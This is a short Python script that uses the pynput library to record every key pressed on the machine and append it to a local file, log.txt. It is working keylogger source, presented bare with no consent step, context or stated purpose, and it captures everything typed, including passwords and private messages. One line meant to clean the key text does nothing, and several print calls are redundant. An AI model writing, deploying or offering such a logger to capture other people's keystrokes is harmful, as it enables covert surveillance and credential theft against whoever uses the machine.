from pynput.keyboard import Key ,Listener

def log_keystroke(key):
	key = str(key).replace("","")

	print(key)

	if key == "Key.backspace":
		print(key)
		key = "[Bck]"
	if key == "Key.tab":
		print(key)
		key = "[Tab]"
	if key == "Key.enter":
		print(key)
		key = "\n"
	if key == "Key.space":
		print(key)
		key = " "
  
	with open("log.txt", 'a') as f:
		f.write(key)
  
with Listener(on_press=log_keystroke) as l:
	l.join()